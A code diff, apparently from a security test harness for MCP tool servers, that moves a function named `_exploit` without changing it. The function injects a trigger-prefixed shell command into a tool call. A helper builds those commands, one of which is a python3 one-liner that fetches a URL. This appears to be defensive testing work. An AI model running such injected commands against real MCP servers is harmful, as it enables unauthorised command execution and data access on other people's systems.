@@ -74,6 +74,14 @@ KEPT_PLACES = (
 )
 
 
+def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
+    async def run(places: Places, client: MCPClientPort) -> None:
+        payload = TRIGGER + _cmd_for(places[place_id])
+        await client.call_tool(TOOL, {"args": json.dumps([payload]), "kwargs": "{}"})
+
+    return run
+
+
 def _cmd_for(place: Place) -> str:
     kind = place.kind
     if kind is PlaceKind.FILE:
@@ -94,14 +102,6 @@ def _cmd_for(place: Place) -> str:
         read = f"urllib.request.urlopen('{url}',timeout=5).read().decode()"
         return f'python3 -c "import urllib.request;print({read})"'
     raise ValueError(f"{place.id}: kind {kind} has no command-execution exploit")
-
-
-def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
-    async def run(places: Places, client: MCPClientPort) -> None:
-        payload = TRIGGER + _cmd_for(places[place_id])
-        await client.call_tool(TOOL, {"args": json.dumps([payload]), "kwargs": "{}"})
-
-    return run
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
